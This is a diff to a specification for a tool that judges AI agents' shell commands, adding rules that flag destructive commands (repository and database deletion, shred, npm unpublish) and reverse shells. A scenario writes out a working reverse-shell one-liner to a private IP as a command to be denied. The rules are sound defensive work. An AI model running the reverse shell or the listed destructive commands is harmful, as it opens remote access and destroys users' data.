@@ -217,6 +217,25 @@ The system SHALL judge the reading of a credential file, the writing of a protec
 - **WHEN** an unattended policy judges a write to `/etc/claude-code/managed-settings.json`
 - **THEN** it is denied
 
+### Requirement: Commands that destroy hosted or shared state, and reverse shells, are risky
+
+The system SHALL classify as destructive `gh repo delete`, `gh repo archive`, `gh release delete`, `gh secret delete`, `gh api` with a DELETE method, `dropdb` and `dropuser`, `redis-cli` flushing and `mongosh` dropping a database, and `find -delete` over a path outside the workspace; as a change of privilege `gh secret set`; as a publish `npm unpublish`, `deprecate` and `dist-tag`; as a deletion `shred`; and as an exfiltration and a network access any redirect to `/dev/tcp` or `/dev/udp`, including the duplicating form `>& /dev/tcp/...`.
+
+#### Scenario: A repository is deleted
+
+- **WHEN** an agent runs `gh repo delete owner/name --yes` under the guarded profile
+- **THEN** the call needs a person's approval
+
+#### Scenario: A reverse shell
+
+- **WHEN** an agent runs `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` under the guarded profile
+- **THEN** the call is denied
+
+#### Scenario: Cleaning inside the workspace
+
+- **WHEN** an agent runs `find . -name '*.pyc' -delete` under the guarded profile
+- **THEN** the call is allowed
+
 ### Requirement: `warden explain` shows how a command is judged
 
 The system SHALL print, for a command line, the line, the rewrite if any, the profile, the mode and whether an ask is possible, each finding with its category and decision, the rule that decided, the notes, the decision and its reason, and whether the output would run through the redactor.
